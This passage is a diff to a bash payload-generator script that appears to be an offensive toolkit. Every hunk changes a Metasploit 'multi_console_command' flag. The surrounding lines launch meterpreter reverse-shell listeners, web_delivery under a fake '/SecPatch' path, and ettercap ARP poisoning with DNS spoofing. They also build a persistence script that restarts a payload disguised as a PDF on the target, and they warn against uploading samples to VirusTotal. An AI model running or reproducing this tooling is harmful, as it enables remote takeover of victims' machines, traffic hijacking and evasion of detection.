-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -4705,9 +4791,9 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -4726,9 +4812,9 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
         fi
@@ -4931,7 +5017,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1
 
     cd $IPATH/aux
-    # Build persistence script (AutoRunStart='multi_console_command -rc')
+    # Build persistence script (AutoRunStart='multi_console_command -r')
     cp persistence.rc persistence[bak].rc
     sed -i "s|N4m|$N4m.pdf|g" persistence.rc
     sed -i "s|IPATH|$IPATH|g" persistence.rc
@@ -5029,9 +5115,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
            if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
             cd $IPATH/output
@@ -5050,9 +5136,9 @@ fi
           else
 
            if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -5070,9 +5156,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -5091,9 +5177,9 @@ fi
           else
 
             if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
         fi
@@ -5175,7 +5261,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1
 
     cd $IPATH/aux
-    # Build persistence script (AutoRunStart='multi_console_command -rc')
+    # Build persistence script (AutoRunStart='multi_console_command -r')
     cp persistence.rc persistence[bak].rc
     sed -i "s|N4m|$N4m.pdf|g" persistence.rc
     sed -i "s|IPATH|$IPATH|g" persistence.rc
@@ -5272,7 +5358,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -5287,7 +5373,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -5302,7 +5388,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -5317,7 +5403,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -6138,7 +6224,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -6153,7 +6239,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -6168,7 +6254,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -6183,7 +6269,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -6388,7 +6474,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -6403,7 +6489,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -6418,7 +6504,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -6433,7 +6519,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -6789,7 +6875,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -6804,7 +6890,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -6820,7 +6906,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -6835,7 +6921,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
 
@@ -6966,7 +7052,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -6981,7 +7067,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             rm report.log > /dev/null 2>&1
